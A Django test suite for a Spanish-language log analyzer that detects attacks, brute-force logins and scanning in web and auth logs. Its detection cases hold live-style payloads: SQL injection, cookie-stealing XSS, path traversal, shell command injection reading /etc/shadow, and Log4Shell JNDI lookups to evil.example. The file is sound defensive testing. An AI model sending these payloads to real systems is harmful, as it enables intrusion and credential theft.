"""Analizador de logs: detecciones, falsos positivos, formatos y rendimiento."""

import time

from django.test import SimpleTestCase

from scanner.analyzer import UMBRAL_404, UMBRAL_FUERZA_BRUTA, analizar_logs


def _acceso(ruta, ip="203.0.113.7", estado=200, ua="Mozilla/5.0"):
    return f'{ip} - - [07/May/2026:10:23:01 +0000] "GET {ruta} HTTP/1.1" {estado} 512 "-" "{ua}"'


def _tipos(resultado):
    return {a["tipo"] for a in resultado["amenazas"]}


class DeteccionTests(SimpleTestCase):
    CASOS = {
        "Posible SQL Injection detectado": [
            "/?id=1 UNION SELECT user,pass FROM users",
            "/?id=1+union+all+select+1,2",
            "/?id=1%27%20or%20%271%27=%271",
            "/?id=1 AND SLEEP(5)",
            "/?q=1;drop table users",
        ],
        "Posible ataque XSS detectado": [
            "/?q=<script>alert(1)</script>",
            "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "/?q=%253Csvg%2520onload%253Dalert(1)%253E",   # doble codificación
            "/?next=javascript:alert(document.cookie)",
        ],
        "Intento de Path Traversal": [
            "/../../etc/passwd",
            "/%2e%2e%2f%2e%2e%2fetc/passwd",
            "/download?f=..%5c..%5cwin.ini",
        ],
        "Posible inyección de comandos (RCE)": [
            "/cgi-bin/x?cmd=;cat%20/etc/shadow",
            "/?ip=1.1.1.1|whoami",
            "/?x=$(id)",
        ],
        "Intento de explotación Log4Shell (JNDI)": [
            "/?x=${jndi:ldap://evil.example/a}",
            "/?x=${${lower:j}ndi:ldap://evil.example/a}",
        ],
        "Búsqueda de archivos sensibles": [
            "/.env", "/.git/config", "/wp-config.php", "/phpmyadmin/", "/backup.sql",
        ],
    }

    def test_detecta_cada_categoria(self):
        for tipo, rutas in self.CASOS.items():
            for ruta in rutas:
                with self.subTest(tipo=tipo, ruta=ruta):
                    self.assertIn(tipo, _tipos(analizar_logs([_acceso(ruta)])))

    def test_herramienta_en_user_agent(self):
        r = analizar_logs([_acceso("/", ua="sqlmap/1.7.2#stable (https://sqlmap.org)")])
        amenaza = next(a for a in r["amenazas"] if "Herramienta" in a["tipo"])
        self.assertEqual(amenaza["detalle"][0]["herramienta"], "sqlmap")

    def test_trafico_normal_sin_falsos_positivos(self):
        lineas = [
            _acceso("/productos?id=5&page=2&orden=precio"),
            _acceso("/blog/como-seleccionar-un-plan"),
            _acceso("/api/v1/users/42", ua="Mozilla/5.0 (compatible; SecurityScanner-Corp/1.0)"),
            _acceso("/static/app.css", estado=304),
            _acceso("/favicon.ico", estado=404),
            "999.999.999.999 - - [07/May/2026:10:23:01 +0000] \"GET / HTTP/1.1\" 200 1",
        ]
        r = analizar_logs(lineas)
        self.assertEqual(r["amenazas"], [])
        self.assertEqual(r["resumen"]["nivel_riesgo"], "BAJO")


class FuerzaBrutaYUmbralesTests(SimpleTestCase):
    def test_fuerza_bruta_por_ip_en_auth_log(self):
        lineas = [
            f"May  7 10:23:{i:02d} srv sshd[123]: Failed password for root from 198.51.100.9 port 22 ssh2"
            for i in range(UMBRAL_FUERZA_BRUTA)
        ] + ["May  7 10:24:00 srv sshd[124]: Failed password for ana from 203.0.113.1 port 22 ssh2"]
        r = analizar_logs(lineas)
        fuerza_bruta = next(a for a in r["amenazas"] if a["tipo"].startswith("Ataque de fuerza bruta"))
        self.assertEqual(fuerza_bruta["cantidad"], 1)
        self.assertIn("198.51.100.9", fuerza_bruta["detalle"][0]["contenido"])
        self.assertIsNone(fuerza_bruta["detalle"][0]["linea"])
        ip = r["ips_sospechosas"][0]
        self.assertEqual((ip["ip"], ip["nivel"], ip["fallos_login"]), ("198.51.100.9", "ALTO", 5))
        self.assertEqual(r["resumen"]["nivel_riesgo"], "ALTO")
        self.assertEqual(r["actividad_por_hora"], {"10": len(lineas)})

    def test_pocos_404_no_son_amenaza(self):
        r = analizar_logs([_acceso(f"/x{i}", estado=404) for i in range(UMBRAL_404 - 1)])
        self.assertEqual(r["amenazas"], [])
        r = analizar_logs([_acceso(f"/x{i}", estado=404) for i in range(UMBRAL_404)])
        self.assertIn("Errores 404 excesivos (posible escaneo de rutas)", _tipos(r))

    def test_cuenta_todo_pero_guarda_pocos_ejemplos(self):
        r = analizar_logs([_acceso("/?q=<script>")] * 100)
        xss = r["amenazas"][0]
        self.assertEqual(xss["cantidad"], 100)
        self.assertEqual(len(xss["detalle"]), 5)

    def test_formatos_de_fecha(self):
        lineas = [
            _acceso("/"),                                     # Apache: 10h
            "2026-05-07T15:00:00Z level=info msg=ok",          # ISO: 15h
            "May  7 22:01:02 srv cron[1]: job ok",             # syslog: 22h
        ]
        self.assertEqual(analizar_logs(lineas)["actividad_por_hora"], {"10": 1, "15": 1, "22": 1})

    def test_acepta_texto_e_iterables(self):
        texto = _acceso("/") + "\n" + _acceso("/a")
        self.assertEqual(analizar_logs(texto)["total_lineas"], 2)
        self.assertEqual(analizar_logs(iter(texto.splitlines()))["total_lineas"], 2)
        self.assertEqual(analizar_logs([])["resumen"]["nivel_riesgo"], "BAJO")


class RendimientoTests(SimpleTestCase):
    def test_linea_gigante_no_provoca_redos(self):
        inicio = time.monotonic()
        analizar_logs(["union " * 200_000, "select " * 200_000])
        self.assertLess(time.monotonic() - inicio, 3)

    def test_log_grande_en_tiempo_razonable(self):
        lineas = [_acceso(f"/pagina/{i}?a=b", ip=f"198.51.{i % 200}.{i % 250}") for i in range(50_000)]
        inicio = time.monotonic()
        analizar_logs(iter(lineas))
        self.assertLess(time.monotonic() - inicio, 10)
